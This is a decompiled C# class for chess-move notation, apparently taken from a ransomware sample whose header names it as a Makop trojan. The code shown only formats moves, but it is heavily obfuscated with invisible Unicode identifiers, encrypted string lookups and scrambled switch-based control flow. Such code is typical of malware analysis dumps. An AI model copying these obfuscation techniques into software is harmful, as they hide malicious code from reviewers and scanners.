// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.Notation
// Assembly: غج, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 646F7626-F199-493A-B5BB-FA317F4F75E5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-7bd25c50eebc6f91a77977f299f7080a7ba1825fe1953c76801546cc96342b39.exe

using System.Runtime.InteropServices;

namespace SimpleChessApp.Game
{
  public class Notation
  {
    public Square from;
    public Square to;

    public string Move
    {
      get
      {
        string move = Notation.\u202D⁮‭‎​‮‮⁫⁯​‍‎​‮‏‬⁬⁮‍‫‫‏‫‎‍‪‪‌‭‪‎⁪‭⁭⁫‬‫‎‪‬‮(this.from.CurrentSquare, \u003CModule\u003E.\u202A‭​‏‏‬⁯​⁫‬‏‬⁫‭‎​‍‪‎‮‍⁪⁯⁮‬​⁮‮‮⁪‭‎‭‪⁫‭‏⁭​‬‮<string>(3781688437U), this.to.CurrentSquare);
label_1:
        int num1 = 1649530076;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 936368231)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -1562442758 ^ -90297482;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return move;
      }
    }

    public Notation(Square f, Square t, Board bo)
    {
label_1:
      int num1 = -491526680;
      Square square1;
      Square square2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1696986011)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            square2.Piece = new ChessPiece(t, t.Piece.Kind, t.Piece.Color);
            num1 = (int) num2 * -429823177 ^ 1164022320;
            continue;
          case 2:
            square1 = new Square(f.File, f.Rank, bo);
            square2 = new Square(t.File, t.Rank, bo);
            num1 = (int) num2 * -1895210206 ^ -507322801;
            continue;
          case 3:
            num1 = (int) num2 * 729298223 ^ -97178992;
            continue;
          case 4:
            this.from = square1;
            this.to = square2;
            num1 = (int) num2 * -1990646549 ^ -1280935007;
            continue;
          case 5:
            goto label_3;
          case 6:
            square1.Piece = new ChessPiece(f, t.Piece.Kind, t.Piece.Color);
            num1 = (int) num2 * -689677328 ^ 1012822854;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1088945481;
      string move;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1110081392)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            move = this.Move;
            num1 = (int) num2 * -1729696021 ^ 564245069;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return move;
    }

    static string \u202D⁮‭‎​‮‮⁫⁯​‍‎​‮‏‬⁬⁮‍‫‫‏‫‎‍‪‪‌‭‪‎⁪‭⁭⁫‬‫‎‪‬‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
